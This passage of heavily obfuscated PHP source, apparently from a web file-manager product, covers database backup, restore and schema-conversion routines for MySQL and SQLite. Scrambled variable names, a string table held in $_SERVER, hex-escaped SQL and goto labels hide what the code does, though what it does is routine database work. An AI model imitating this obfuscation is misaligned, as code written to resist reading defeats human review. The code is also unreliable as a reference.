$this->parseField(!empty($ˆ÷¤šá¹[$•¢‹ï°[273]]) ? $ˆ÷¤šá¹[$•¢‹ï°[273]] : $•¢‹ï°[188]), $this->parseJoin(!empty($ˆ÷¤šá¹[$•¢‹ï°[282]]) ? $ˆ÷¤šá¹[$•¢‹ï°[282]] : $•¢‹ï°[12]), $this->parseWhere(!empty($ˆ÷¤šá¹[$•¢‹ï°[275]]) ? $ˆ÷¤šá¹[$•¢‹ï°[275]] : $•¢‹ï°[12]), $this->parseGroup(!empty($ˆ÷¤šá¹[$•¢‹ï°[515]]) ? $ˆ÷¤šá¹[$•¢‹ï°[515]] : $•¢‹ï°[12]), $this->parseHaving(!empty($ˆ÷¤šá¹[$•¢‹ï°[1058]]) ? $ˆ÷¤šá¹[$•¢‹ï°[1058]] : $•¢‹ï°[12]), $this->parseOrder(!empty($ˆ÷¤šá¹[$•¢‹ï°[365]]) ? $ˆ÷¤šá¹[$•¢‹ï°[365]] : $•¢‹ï°[12]), $this->parseLimit(!empty($ˆ÷¤šá¹[$•¢‹ï°[292]]) ? $ˆ÷¤šá¹[$•¢‹ï°[292]] : $•¢‹ï°[12]), $this->parseUnion(!empty($ˆ÷¤šá¹[$•¢‹ï°[347]]) ? $ˆ÷¤šá¹[$•¢‹ï°[347]] : $•¢‹ï°[12]), $this->parseComment(!empty($ˆ÷¤šá¹[$•¢‹ï°[354]]) ? $ˆ÷¤šá¹[$•¢‹ï°[354]] : $•¢‹ï°[12])), $Ş·Şœş²); return $Ş·Şœş²; } public function getLastSql($†Ê¢Ú©š = '') { return $†Ê¢Ú©š ? $this->modelSql[$†Ê¢Ú©š] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ˆ…åÏ’) { return addslashes($ˆ…åÏ’); } public function setModel($íıÙŞİ) { $this->model = $íıÙŞİ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($é­ñóÁì = array()) { $Üˆèõò =& $_SERVER[ßğøİ]; if (empty($é­ñóÁì)) { $é­ñóÁì = $GLOBALS[$Üˆèõò[6]][$Üˆèõò[21]]; } $this->database = $é­ñóÁì; } public function model($€ÃĞ–ƒ† = '') { return new ModelBase($€ÃĞ–ƒ†, $_SERVER[ßğøİ][12], $this->database); } public function db($ŒÂÇëÊæ = false) { $Ó±¨”õğ =& $_SERVER[ßğøİ]; $Ş¿à†¨ = array_change_key_case($this->database); if ($this->dbType() == $Ó±¨”õğ[13] || !$ŒÂÇëÊæ) { return $this->model()->db(); } $¸¦¼×ßå = $Ş¿à†¨[$Ó±¨”õğ[972]]; $Ş¿à†¨[$Ó±¨”õğ[972]] = $Ó±¨”õğ[12]; if ($Ş¿à†¨[$Ó±¨”õğ[967]] == $Ó±¨”õğ[964]) { $³ÉİÚ¶ = $Ş¿à†¨[$Ó±¨”õğ[973]]; $Ş¿à†¨[$Ó±¨”õğ[973]] = substr($³ÉİÚ¶, 0, strrpos($³ÉİÚ¶, $Ó±¨”õğ[1059])); } $this->database = $Ş¿à†¨; $–Ğ•ùâ = $this->model()->db(); try { $ªŒïüï’ = $–Ğ•ùâ->execute("\163\150\157\x77\x20\x64\x61\164\141\x62\x61\x73\x65\x73\x20\x6c\151\x6b\145\x20\47{$¸¦¼×ßå}\x27"); } catch (Exception $Š±•®Ë) { } if (!$ªŒïüï’) { $–Ğ•ùâ->execute("\x63\x72\145\x61\x74\145\40\x64\x61\x74\x61\x62\x61\x73\145\x20\x60{$¸¦¼×ßå}\140"); } $Ş¿à†¨[$Ó±¨”õğ[972]] = $¸¦¼×ßå; if ($Ş¿à†¨[$Ó±¨”õğ[967]] == $Ó±¨”õğ[964]) { $Ş¿à†¨[$Ó±¨”õğ[973]] .= $Ó±¨”õğ[1059] . $¸¦¼×ßå; } $this->database = $Ş¿à†¨; $–Ğ•ùâ->execute("\165\163\x65\40\x60{$¸¦¼×ßå}\x60"); return $–Ğ•ùâ; } public function createTable($‡ÎüƒÉ, &$û°œïÔÇ) { $“ëÓî× =& $_SERVER[ßğøİ]; if (!IO::exist($‡ÎüƒÉ)) { ActionCall($“ëÓî×[1060], !0, 0); show_json(LNG($“ëÓî×[1061]), !1); } $¶˜¨¨Ş = $this->model()->db(); $úâ†ßâ = sqlSplit(IO::getContent($‡ÎüƒÉ)); foreach ($úâ†ßâ as $¿×æ) { $Ô§­£¾Æ = stripos($¿×æ, $“ëÓî×[1062]) === 0; if ($Ô§­£¾Æ) { $û°œïÔÇ->task[$“ëÓî×[783]] += 1; } $¶˜¨¨Ş->execute($¿×æ); if ($Ô§­£¾Æ) { preg_match($“ëÓî×[1063], $¿×æ, $©ñ¿©‡…); $û°œïÔÇ->task[$“ëÓî×[1064]] = $©ñ¿©‡…[1]; $û°œïÔÇ->update(1); } } } public function insertTable($òÃ©¾ÜÙ, &$«¾ºÀæ²) { $§¤ ÀÒ¾ =& $_SERVER[ßğøİ]; $œõ®—©¸ = $this->model()->db(); $ØıÉÙğª = $ó¢³€²· ? array($ó¢³€²·) : $œõ®—©¸->getTables(); foreach ($òÃ©¾ÜÙ as $ˆ×Ì¡Ï) { $ó¢³€²· = basename($ˆ×Ì¡Ï, $§¤ ÀÒ¾[785]); if (!in_array($ó¢³€²·, $ØıÉÙğª)) { continue; } $«¾ºÀæ²->task[$§¤ ÀÒ¾[1064]] = $ó¢³€²·; if (get_filesize($ˆ×Ì¡Ï) == 0) { continue; } $µ±ÃŒ = $this->sqlToDb($ˆ×Ì¡Ï, $«¾ºÀæ²); if (!$µ±ÃŒ) { ActionCall($§¤ ÀÒ¾[1060], !0, 0); show_json(LNG($§¤ ÀÒ¾[1065]) . "\133{$ó¢³€²·}\x5d", !1); } } } public function sqlFromDb($‡˜Ö×“, $ÕÛĞ£“ë, &$ôÅÖúë„, $¦ÈÛ›²É = '') { if ($ôÅÖúë„) { $ôÅÖúë„->task[$_SERVER[ßğøİ][1064]] = $‡˜Ö×“; } $¬üÙ£Ü = $this->model($‡˜Ö×“); $óÇÃ³­Å = 0; $”ÌñßìÒ = 0; $©ÖÁ‚Ì¢ = 10000; $ºÒ¦ÊèÈ = fopen($ÕÛĞ£“ë, $_SERVER[ßğøİ][1066]); $Ş–³ÛŸ­ = $¬üÙ£Ü->getPk(); $Ç¿£Ñ¡ = $¬üÙ£Ü->getDbFields(); $¸ÂƒëÖà = $_SERVER[ßğøİ][12]; if ($GLOBALS[$_SERVER[ßğøİ][784]] && in_array($‡˜Ö×“, array($_SERVER[ßğøİ][1067], $_SERVER[ßğøİ][1068]))) { $¸ÂƒëÖà = $‡˜Ö×“; } do { $ªÄƒş†” = array($Ş–³ÛŸ­ => array($_SERVER[ßğøİ][1014], $”ÌñßìÒ)); $ ¤ù¥™— = $¬üÙ£Ü->where($ªÄƒş†”)->field($Ç¿£Ñ¡)->order($Ş–³ÛŸ­ . $_SERVER[ßğøİ][1069])->limit($©ÖÁ‚Ì¢)->select(); $ ¤ù¥™— = !empty($ ¤ù¥™—) ? $ ¤ù¥™— : array(); if (!($ÕŠ­±È = count($ ¤ù¥™—))) { break; } $ä•ï¿ôÉ = end($ ¤ù¥™—); $”ÌñßìÒ = $ä•ï¿ôÉ[$Ş–³ÛŸ­]; $¾·ùšÎ = array(); foreach ($ ¤ù¥™— as $ìùï¹Ïù) { if ($¸ÂƒëÖà) { if ($‡˜Ö×“ == $_SERVER[ßğøİ][1067]) { if ($ìùï¹Ïù[$_SERVER[ßğøİ][33]] == $_SERVER[ßğøİ][1070]) { $õ¶ÓœÇì = json_decode($ìùï¹Ïù[$_SERVER[ßğøİ][374]], !0); if ($õ¶ÓœÇì[$_SERVER[ßğøİ][32]] == $GLOBALS[$_SERVER[ßğøİ][784]] && $õ¶ÓœÇì[$_SERVER[ßğøİ][747]] != 1) { continue; } } } else { if ($ìùï¹Ïù[$_SERVER[ßğøİ][33]] == $_SERVER[ßğøİ][1071] && $ìùï¹Ïù[$_SERVER[ßğøİ][94]] == $_SERVER[ßğøİ][776]) { continue; } } } if ($¦ÈÛ›²É) { $ìùï¹Ïù[$_SERVER[ßğøİ][84]] = "\173\x69\x6f\x3a{$¦ÈÛ›²É}\x7d" . substr($ìùï¹Ïù[$_SERVER[ßğøİ][84]], strlen("\x7b\x69\157\72{$ìùï¹Ïù[$_SERVER[ßğøİ][814]]}\x7d")); $ìùï¹Ïù[$_SERVER[ßğøİ][814]] = $¦ÈÛ›²É; } $¾·ùšÎ[] = $_SERVER[ßğøİ][1072] . $this->sqlEncode($ìùï¹Ïù) . $_SERVER[ßğøİ][1073]; } $”‘ÖŒÔ– = "\x49\x4e\x53\105\122\x54\40\x49\x4e\124\117\x20\140{$‡˜Ö×“}\140\40\50\140" . implode($_SERVER[ßğøİ][1074], $Ç¿£Ñ¡) . $_SERVER[ßğøİ][1075]; fwrite($ºÒ¦ÊèÈ, $”‘ÖŒÔ– . implode($_SERVER[ßğøİ][1076], $¾·ùšÎ) . $_SERVER[ßğøİ][71] . PHP_EOL); $óÇÃ³­Å += $ÕŠ­±È; if ($ôÅÖúë„) { $ôÅÖúë„->update($ÕŠ­±È); } } while ($©ÖÁ‚Ì¢ == $ÕŠ­±È); fclose($ºÒ¦ÊèÈ); return $óÇÃ³­Å; } public function sqlToDb($‘Ê’ØØ, &$İêî¹¼) { $ÍØ˜ı =& $_SERVER[ßğøİ]; $—ù™ê–Ì = $this->model()->db(); $˜ĞÎ¦å = @fopen($‘Ê’ØØ, $ÍØ˜ı[1077]); if (!$˜ĞÎ¦å) { return !1; } $ã¶ô€âÀ = 0; $‹şÀå¼Ã = $ÍØ˜ı[12]; $çö™Í‚ = array(); $ÔµêÂõœ = $this->dbType(); $«·©ë‡á = $ÔµêÂõœ == $ÍØ˜ı[13] ? 500 : 2000; $ëĞÂˆÜ¾ = basename($‘Ê’ØØ, $ÍØ˜ı[785]); $Ö²›“Ü‰ = 0; $õ¨â¢ƒÆ = 4194304 - 104858; $ÜèÙ€’ø = 1000000 - 104858; while (!feof($˜ĞÎ¦å)) { $õˆøÛç” = trim(fgets($˜ĞÎ¦å)); if (!$õˆøÛç”) { continue; } $§”¥ä¤º = $this->sqlDecode($õˆøÛç”, $ÔµêÂõœ, $ëĞÂˆÜ¾); if (stripos($§”¥ä¤º, $ÍØ˜ı[355]) === 0) { if (!$‹şÀå¼Ã) { $‹şÀå¼Ã = $§”¥ä¤º . $ÍØ˜ı[53]; } continue; } if ($İêî¹¼) { $İêî¹¼->task[$ÍØ˜ı[783]] += 1; } $ã¶ô€âÀ++; $çö™Í‚[] = rtrim(rtrim(trim($§”¥ä¤º), $ÍØ˜ı[50]), $ÍØ˜ı[71]); $¯¿‹¢² = null; $õÏº­¼› = strlen($§”¥ä¤º); $Ö²›“Ü‰ += $õÏº­¼›; if ($Ö²›“Ü‰ >= ($«·©ë‡á == 500 ? $ÜèÙ€’ø : $õ¨â¢ƒÆ)) { $¯¿‹¢² = array_pop($çö™Í‚); if ($ã¶ô€âÀ > 1) { $ã¶ô€âÀ--; } } if ($ã¶ô€âÀ >= $«·©ë‡á || $¯¿‹¢²) { $§”¥ä¤º = $‹şÀå¼Ã . implode($ÍØ˜ı[50], $çö™Í‚); if (!$—ù™ê–Ì->execute($§”¥ä¤º)) { return !1; } if ($İêî¹¼) { $İêî¹¼->update($ã¶ô€âÀ); } $çö™Í‚ = array(); $ã¶ô€âÀ = 0; $Ö²›“Ü‰ = 0; if ($¯¿‹¢²) { $çö™Í‚ = array($¯¿‹¢²); $ã¶ô€âÀ = 1; $Ö²›“Ü‰ = $õÏº­¼›; } } } fclose($˜ĞÎ¦å); if (!empty($çö™Í‚)) { $§”¥ä¤º = $‹şÀå¼Ã . implode($ÍØ˜ı[50], $çö™Í‚); if (!$—ù™ê–Ì->execute($§”¥ä¤º)) { return !1; } if ($İêî¹¼) { $İêî¹¼->update($ã¶ô€âÀ); } } return !0; } public function dropTable($ü÷ı—ˆĞ = null) { $Ÿ—Ïèüİ = $this->model()->db(); $¤¯æåÀú = $ü÷ı—ˆĞ ? array($ü÷ı—ˆĞ) : $Ÿ—Ïèüİ->getTables(); if (!$¤¯æåÀú) { return; } foreach ($¤¯æåÀú as $ü÷ı—ˆĞ) { if ($ü÷ı—ˆĞ) { $ü÷ı—ˆĞ = strtolower($ü÷ı—ˆĞ); } else { continue; } $Ÿ—Ïèüİ->execute("\x64\162\x6f\x70\40\164\141\x62\154\x65\40\x69\x66\x20\145\170\151\163\164\x73\40\140{$ü÷ı—ˆĞ}\x60"); } } private function sqlEncode($ËÎ†“şÙ) { $èíÌÄæ§ =& $_SERVER[ßğøİ]; $¦µåêÅ = array(); foreach ($ËÎ†“şÙ as $«¨ù†±ù) { if (is_array($«¨ù†±ù)) { $«¨ù†±ù = json_encode_force($«¨ù†±ù); } $«¨ù†±ù = addslashes($«¨ù†±ù); $«¨ù†±ù = str_replace(array($èíÌÄæ§[1078], $èíÌÄæ§[231]), array($èíÌÄæ§[1079], $èíÌÄæ§[1080]), $«¨ù†±ù); $¦µåêÅ[] = str_replace($èíÌÄæ§[58], $èíÌÄæ§[1081], $«¨ù†±ù); } return $èíÌÄæ§[58] . implode($èíÌÄæ§[1082], $¦µåêÅ) . $èíÌÄæ§[58]; } private function sqlDecode($µ„±éóĞ, $˜ÎŠ­ôò, $µ¿Ü‹ªù = '') { $êµ‚Èã‹ =& $_SERVER[ßğøİ]; $µ„±éóĞ = str_replace(array($êµ‚Èã‹[1079], $êµ‚Èã‹[1080]), array($êµ‚Èã‹[1078], $êµ‚Èã‹[231]), $µ„±éóĞ); if ($˜ÎŠ­ôò == $êµ‚Èã‹[13]) { return $µ¿Ü‹ªù != $êµ‚Èã‹[1083] ? stripslashes($µ„±éóĞ) : $µ„±éóĞ; } if ($µ¿Ü‹ªù == $êµ‚Èã‹[1083]) { $µ„±éóĞ = str_replace($êµ‚Èã‹[1084], $êµ‚Èã‹[118], stripslashes($µ„±éóĞ)); } return $µ„±éóĞ; } public function getSqlFile($Ä¢ß×¶ç = '') { $·¦€·©ï =& $_SERVER[ßğøİ]; $Ôáğğ–ü = $this->dbType(!0); $Ğ°±ÈÌ‰ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\x6c\154\57\x64\x61\x74\141\57{$Ôáğğ–ü}\x2e\163\161\154"; $ÕµŞÕ¤† = file_get_contents($Ğ°±ÈÌ‰); $ÏÍÛòÄ” = $·¦€·©ï[1085] . ($Ôáğğ–ü == $·¦€·©ï[801] ? $·¦€·©ï[1086] : $·¦€·©ï[1087]) . $·¦€·©ï[1088]; preg_match_all($ÏÍÛòÄ”, $ÕµŞÕ¤†, $Ãìô®êâ); $·„Â¤¥˜ = $Ãìô®êâ[1]; $©™Œ÷Ôì = $this->model()->db(); $é™àò°µ = $©™Œ÷Ôì->getTables(); $Ôäã›¶è = TEMP_FILES . $·¦€·©ï[1089] . date($·¦€·©ï[748]) . $·¦€·©ï[8]; del_dir($Ôäã›¶è); mk_dir($Ôäã›¶è); $ô¿Úä = $Ôäã›¶è . $·¦€·©ï[1090]; $‰Ûü°¨§ = $Ôäã›¶è . $·¦€·©ï[1091]; $Ú¹ÌÉş¹ = $Ôáğğ–ü == $·¦€·©ï[13] ? $·¦€·©ï[801] : $·¦€·©ï[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\141\154\x6c\x2f\x64\x61\x74\141\x2f{$Ú¹ÌÉş¹}\56\x73\161\154", $Ôäã›¶è); @touch($Ôäã›¶è . $Ôáğğ–ü . $·¦€·©ï[785]); $ûÎ›Î·… = fopen($ô¿Úä, $·¦€·©ï[1066]); $Î¼–†Ç… = fopen($‰Ûü°¨§, $·¦€·©ï[1066]); if ($Ôáğğ–ü == $·¦€·©ï[13]) { $é™àò°µ = array_diff($é™àò°µ, array($·¦€·©ï[781], $·¦€·©ï[782])); $•«äÑ… = array($·¦€·©ï[1092], $·¦€·©ï[1093], $·¦€·©ï[1094]); fwrite($Î¼–†Ç…, implode(PHP_EOL, $•«äÑ…) . PHP_EOL . PHP_EOL); foreach ($é™àò°µ as $ì¨¶•§) { $½Ã²ô• = $this->sqlFromSqlite($ì¨¶•§); if (!$½Ã²ô•[$·¦€·©ï[13]]) { continue; } fwrite($Î¼–†Ç…, $½Ã²ô•[$·¦€·©ï[13]] . PHP_EOL . PHP_EOL); if (!in_array($ì¨¶•§, $·„Â¤¥˜)) { fwrite($ûÎ›Î·…, $½Ã²ô•[$·¦€·©ï[801]] . PHP_EOL . PHP_EOL); } } } else { foreach ($é™àò°µ as $ì¨¶•§) { $½Ã²ô• = $this->sqlFromMysql($ì¨¶•§); if (!$½Ã²ô•[$·¦€·©ï[801]]) { continue; } fwrite($ûÎ›Î·…, $½Ã²ô•[$·¦€·©ï[801]] . PHP_EOL . PHP_EOL); if (!in_array($ì¨¶•§, $·„Â¤¥˜)) { fwrite($Î¼–†Ç…, $½Ã²ô•[$·¦€·©ï[13]] . PHP_EOL . PHP_EOL); } } } fclose($ûÎ›Î·…); fclose($Î¼–†Ç…); $ÕµŞÕ¤† = array($·¦€·©ï[801] => $ô¿Úä, $·¦€·©ï[13] => $‰Ûü°¨§); return $Ä¢ß×¶ç ? $ÕµŞÕ¤†[$Ä¢ß×¶ç] : $ÕµŞÕ¤†; } public function dbType($Ñœ¾¤ÅÈ = false) { $«è­êüó =& $_SERVER[ßğøİ]; $Êãµ¤úø = $Ñœ¾¤ÅÈ ? $GLOBALS[$«è­êüó[6]][$«è­êüó[21]] : $this->database; $Êãµ¤úø = array_change_key_case($Êãµ¤úø); $•ßœ—õô = $Êãµ¤úø[$«è­êüó[967]]; if ($•ßœ—õô == $«è­êüó[964]) { $ìªşÇ³ = explode($«è­êüó[4], $Êãµ¤úø[$«è­êüó[973]]); $•ßœ—õô = $ìªşÇ³[0]; } $ÓŞöÇ• = array($«è­êüó[1095] => $«è­êüó[13], $«è­êüó[912] => $«è­êüó[801]); if (isset($ÓŞöÇ•[$•ßœ—õô])) { $•ßœ—õô = $ÓŞöÇ•[$•ßœ—õô]; } return $•ßœ—õô; } public function sqlFromMysql($²×Ê‰²Ü, $ÇÈâ = '') { $öıˆ‡›Ò =& $_SERVER[ßğøİ]; $Ñ—¥Ô¦İ = $this->model()->db(); $ƒ°ÙæŸ = $Ñ—¥Ô¦İ->query($öıˆ‡›Ò[1096] . $²×Ê‰²Ü . $öıˆ‡›Ò[385]); if (!$ƒ°ÙæŸ || !$ƒ°ÙæŸ[0]) { return !1; } $ó³•¦çê = _get($ƒ°ÙæŸ[0], $öıˆ‡›Ò[1097], $öıˆ‡›Ò[12]); if (!$ó³•¦çê) { return !1; } $ãÍí«£ = "\104\x52\117\120\x20\x54\101\102\114\105\x20\111\x46\x20\105\x58\111\123\124\123\40\x60{$²×Ê‰²Ü}\x60\73" . PHP_EOL . $ó³•¦çê . $öıˆ‡›Ò[71]; if ($ÇÈâ && $ÇÈâ == $öıˆ‡›Ò[801]) { return $ãÍí«£; } $¸±ÒêÉœ = array_change_key_case($GLOBALS[$öıˆ‡›Ò[6]][$öıˆ‡›Ò[21]]); $€É³•ÜÃ = $¸±ÒêÉœ[$öıˆ‡›Ò[972]]; $º¿Šµò = $öıˆ‡›Ò[1098] . $€É³•ÜÃ . $öıˆ‡›Ò[1099] . $²×Ê‰²Ü . $öıˆ‡›Ò[58]; $÷±ËŸ‰« = $öıˆ‡›Ò[1100] . $²×Ê‰²Ü . $öıˆ‡›Ò[899]; $‡ÒŠ‰çÆ = $Ñ—¥Ô¦İ->query($º¿Šµò); if (empty($‡ÒŠ‰çÆ)) { $¢ì¤ï„î = array($öıˆ‡›Ò[801] => $öıˆ‡›Ò[12], $öıˆ‡›Ò[13] => $öıˆ‡›Ò[12]); return $ÇÈâ ? $¢ì¤ï„î[$ÇÈâ] : $¢ì¤ï„î; } $á ¾ãì = $Ñ—¥Ô¦İ->query($÷±ËŸ‰«); $‰ôã•­ = $öıˆ‡›Ò[12]; $€´©õËÑ = array(); foreach ($á ¾ãì as $£ÅåÛîª) { if (!$‰ôã•­ && $£ÅåÛîª[$öıˆ‡›Ò[1101]] == $öıˆ‡›Ò[1102]) { $‰ôã•­ = $£ÅåÛîª[$öıˆ‡›Ò[1103]]; } if (isset($€´©õËÑ[$£ÅåÛîª[$öıˆ‡›Ò[1101]]])) { $€´©õËÑ[$£ÅåÛîª[$öıˆ‡›Ò[1101]]][$öıˆ‡›Ò[1104]][] = $£ÅåÛîª[$öıˆ‡›Ò[1103]]; continue; } $€´©õËÑ[$£ÅåÛîª[$öıˆ‡›Ò[1101]]] = array($öıˆ‡›Ò[1105] => $£ÅåÛîª[$öıˆ‡›Ò[1101]], $öıˆ‡›Ò[1104] => array($£ÅåÛîª[$öıˆ‡›Ò[1103]]), $öıˆ‡›Ò[1106] => $£ÅåÛîª[$öıˆ‡›Ò[1107]] == $öıˆ‡›Ò[88] ? 0 : 1); } $ö‰¥âŸ½ = array(); foreach ($€´©õËÑ as $£ÅåÛîª) { $¹ÅïÇ˜Î = $£ÅåÛîª[$öıˆ‡›Ò[1105]] == $öıˆ‡›Ò[1102]; $¯µêñšó = array($öıˆ‡›Ò[1108], $£ÅåÛîª[$öıˆ‡›Ò[1106]] == $öıˆ‡›Ò[88] && !$¹ÅïÇ˜Î ? $öıˆ‡›Ò[1109] : $öıˆ‡›Ò[12], $öıˆ‡›Ò[1110], $öıˆ‡›Ò[1111] . $²×Ê‰²Ü . $öıˆ‡›Ò[11] . ($¹ÅïÇ˜Î ? $öıˆ‡›Ò[1112] : $£ÅåÛîª[$öıˆ‡›Ò[1105]]) . $öıˆ‡›Ò[118], $öıˆ‡›Ò[1113], $öıˆ‡›Ò[118] . $²×Ê‰²Ü . $öıˆ‡›Ò[118], $öıˆ‡›Ò[1114] . implode($öıˆ‡›Ò[1115], $£ÅåÛîª[$öıˆ‡›Ò[1104]]) . $öıˆ‡›Ò[1116]); $ö‰¥âŸ½[] = implode($öıˆ‡›Ò[53], $¯µêñšó) . $öıˆ‡›Ò[71]; } $ñ•Ãì³ó = array(); $ÜÃÄš”Ÿ = array($öıˆ‡›Ò[1117] => $öıˆ‡›Ò[1118], $öıˆ‡›Ò[1118] => $öıˆ‡›Ò[1118], $öıˆ‡›Ò[288] => $öıˆ‡›Ò[315], $öıˆ‡›Ò[287] => $öıˆ‡›Ò[315]); foreach ($‡ÒŠ‰çÆ as $£ÅåÛîª) { $¯µêñšó = array($öıˆ‡›Ò[118] . $£ÅåÛîª[$öıˆ‡›Ò[1119]] . $öıˆ‡›Ò[118], isset($ÜÃÄš”Ÿ[$£ÅåÛîª[$öıˆ‡›Ò[1120]]]) ? $ÜÃÄš”Ÿ[$£ÅåÛîª[$öıˆ‡›Ò[1120]]] : $£ÅåÛîª[$öıˆ‡›Ò[1121]], $£ÅåÛîª[$öıˆ‡›Ò[1122]] == $öıˆ‡›Ò[897] ? $öıˆ‡›Ò[1123] : $öıˆ‡›Ò[1124], $£ÅåÛîª[$öıˆ‡›Ò[1119]] == $‰ôã•­ ? $öıˆ‡›Ò[1125] : $öıˆ‡›Ò[12], $£ÅåÛîª[$öıˆ‡›Ò[949]] ? strtoupper(str_replace($öıˆ‡›Ò[11], $öıˆ‡›Ò[12], $£ÅåÛîª[$öıˆ‡›Ò[949]])) : $öıˆ‡›Ò[12]); $ñ•Ãì³ó[] = trim(implode($öıˆ‡›Ò[53], $¯µêñšó)); } $ûŞ¨„ìÙ = array($öıˆ‡›Ò[1126] . $²×Ê‰²Ü . $öıˆ‡›Ò[1127], $öıˆ‡›Ò[1128] . $²×Ê‰²Ü . $öıˆ‡›Ò[1129], implode($öıˆ‡›Ò[50] . PHP_EOL, $ñ•Ãì³ó), $öıˆ‡›Ò[946]); $×§º„›ê = implode(PHP_EOL, array_merge($ûŞ¨„ìÙ, $ö‰¥âŸ½)); if ($ÇÈâ && $ÇÈâ == $öıˆ‡›Ò[13]) { return $×§º„›ê; } $¢ì¤ï„î = array($öıˆ‡›Ò[801] => $ãÍí«£, $öıˆ‡›Ò[13] => $×§º„›ê); return $ÇÈâ ? $¢ì¤ï„î[$ÇÈâ] : $¢ì¤ï„î; } public function sqlFromSqlite($õìÑ€ÒŸ, $ÍÌ‰ù‹ = '') { $¿ûÆ£ëÆ =& $_SERVER[ßğøİ]; $‡„ÑÖ = $this->model()->db(); $™ÈĞëƒ = "\x50\x52\101\x47\115\x41\x20\124\101\102\x4c\105\137\111\116\x46\117\x20\x28\x27{$õìÑ€ÒŸ}\x27\51"; $Èº¿Óßå = "\x53\x45\x4c\x45\103\x54\40\x2a\x20\x46\122\117\115\x20\x73\x71\154\x69\164\x65\137\x6d\x61\163\x74\x65\x72\40\x57\110\x45\x52\105\x20\x74\x62\154\x5f\x6e\141\155\x65\40\75\x20\47{$õìÑ€ÒŸ}\47"; $ò¬¼ï–– = $‡„ÑÖ->query($™ÈĞëƒ); if (empty($ò¬¼ï––)) { $¿Ÿ×‡ÚÂ = array($¿ûÆ£ëÆ[801] => $¿ûÆ£ëÆ[12], $¿ûÆ£ëÆ[13] => $¿ûÆ£ëÆ[12]); return $ÍÌ‰ù‹ ? $¿Ÿ×‡ÚÂ[$ÍÌ‰ù‹] : $¿Ÿ×‡ÚÂ; } $Â—Ò§Ÿ = $‡„ÑÖ->query($Èº¿Óßå); $˜¥û¨ = $®ûá¨ = array(); foreach ($Â—Ò§Ÿ as $Ú°—ã³›) { if ($Ú°—ã³›[$¿ûÆ£ëÆ[33]] == $¿ûÆ£ëÆ[279]) { $˜¥û¨[] = $Ú°—ã³›[$¿ûÆ£ëÆ[1130]]; } else { $®ûá¨[$Ú°—ã³›[$¿ûÆ£ëÆ[32]]] = $Ú°—ã³›[$¿ûÆ£ëÆ[1130]]; } } $ú”ªçÊÚ = array_merge(array($¿ûÆ£ëÆ[1126] . $õìÑ€ÒŸ . $¿ûÆ£ëÆ[118]), $˜¥û¨, array_values($®ûá¨)); $ú”ªçÊÚ = implode($¿ûÆ£ëÆ[71] . PHP_EOL, $ú”ªçÊÚ) . $¿ûÆ£ëÆ[71]; if ($ÍÌ‰ù‹ && $ÍÌ‰ù‹ == $¿ûÆ£ëÆ[13]) { return $ú”ªçÊÚ; } $»Ø‡ìæç = array(); $º¯‰®õ = array($¿ûÆ£ëÆ[1118] => $¿ûÆ£ëÆ[1131], $¿ûÆ£ëÆ[315] => $¿ûÆ£ëÆ[1132]); $Ù”Üí®È = $¿ûÆ£ëÆ[12]; foreach ($ò¬¼ï–– as $Ú°—ã³›) { if ($Ú°—ã³›[$¿ûÆ£ëÆ[57]] == $¿ûÆ£ëÆ[88]) { $Ù”Üí®È = $Ú°—ã³›[$¿ûÆ£ëÆ[32]]; } $İóã´Ò˜ = array($¿ûÆ£ëÆ[385] . $Ú°—ã³›[$¿ûÆ£ëÆ[32]] . $¿ûÆ£ëÆ[385], isset($º¯‰®õ[$Ú°—ã³›[$¿ûÆ£ëÆ[33]]]) ? $º¯‰®õ[$Ú°—ã³›[$¿ûÆ£ëÆ[33]]] : $Ú°—ã³›[$¿ûÆ£ëÆ[33]], $Ú°—ã³›[$¿ûÆ£ëÆ[35]] == $¿ûÆ£ëÆ[88] ? $¿ûÆ£ëÆ[1123] : $¿ûÆ£ëÆ[1133] . $Ú°—ã³›[$¿ûÆ£ëÆ[56]], $Ú°—ã³›[$¿ûÆ£ëÆ[57]] == $¿ûÆ£ëÆ[88] ? $¿ûÆ£ëÆ[1134] : $¿ûÆ£ëÆ[12]); $»Ø‡ìæç[] = trim(implode($¿ûÆ£ëÆ[53], $İóã´Ò˜)); } foreach ($®ûá¨ as $® ëÁÖ => $¯„Ç¥¯Ò) { $¡Ã—±ĞØ = str_replace($¿ûÆ£ëÆ[1135] . $õìÑ€ÒŸ . $¿ûÆ£ëÆ[11], $¿ûÆ£ëÆ[12], $® ëÁÖ); $íà­òõ€ = str_replace(array($¿ûÆ£ëÆ[118], $¿ûÆ£ëÆ[957]), $¿ûÆ£ëÆ[385], substr($¯„Ç¥¯Ò, stripos($¯„Ç¥¯Ò, $¿ûÆ£ëÆ[260]))); if ($¡Ã—±ĞØ == $¿ûÆ£ëÆ[1112]) { $÷şŸÌÅË = $¿ûÆ£ëÆ[1136] . $Ù”Üí®È . $¿ûÆ£ëÆ[1137]; } else { $÷şŸÌÅË = (stripos($¡Ã—±ĞØ, $¿ûÆ£ëÆ[11]) ? $¿ûÆ£ëÆ[1138] : $¿ûÆ£ëÆ[12]) . ($¿ûÆ£ëÆ[1139] . $¡Ã—±ĞØ . $¿ûÆ£ëÆ[1140] . $íà­òõ€); } $»Ø‡ìæç[] = $÷şŸÌÅË; } $‰“áœğ = array($¿ûÆ£ëÆ[1141] . $õìÑ€ÒŸ . $¿ûÆ£ëÆ[1142], $¿ûÆ£ëÆ[1143] . $õìÑ€ÒŸ . $¿ûÆ£ëÆ[1144], implode($¿ûÆ£ëÆ[50] . PHP_EOL, $»Ø‡ìæç), $¿ûÆ£ëÆ[1145]); $äÊ™ˆ¥ß = implode(PHP_EOL, $‰“áœğ); if ($ÍÌ‰ù‹ && $ÍÌ‰ù‹ == $¿ûÆ£ëÆ[801]) { return $äÊ™ˆ¥ß; } $¿Ÿ×‡ÚÂ = array($¿ûÆ£ëÆ[801] => $äÊ™ˆ¥ß, $¿ûÆ£ëÆ[13] => $ú”ªçÊÚ); return $ÍÌ‰ù‹ ? $¿Ÿ×‡ÚÂ[$ÍÌ‰ù‹] : $¿Ÿ×‡ÚÂ; } } goto Eí»Ûß£ò’; Aå´íç´ª: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($†ó°‘) { $‘›™¸ƒõ =& $_SERVER[ßğøİ]; 